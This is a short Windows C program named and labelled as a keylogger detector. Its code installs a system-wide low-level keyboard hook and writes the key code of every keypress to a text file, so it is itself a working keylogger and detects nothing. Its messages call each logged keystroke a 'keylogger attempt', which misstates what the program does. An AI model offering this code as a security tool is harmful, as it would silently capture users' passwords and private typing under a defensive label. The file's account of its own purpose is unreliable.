// keylogger_detector.c
#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK hHook = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        
        FILE *fp = fopen("keylog_attempts.txt", "a");
        if (fp != NULL) {
            fprintf(fp, "Keylogger attempt detected: Key Code = %d\n", p->vkCode);
            fclose(fp);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void InstallHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) {
        fprintf(stderr, "Failed to install hook!\n");
        exit(1);
    }
    printf("Hook installed. Monitoring for keylogger attempts...\n");
}

void RemoveHook() {
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        printf("Hook removed.\n");
    }
}

int main() {
    InstallHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    RemoveHook();
    return 0;
}
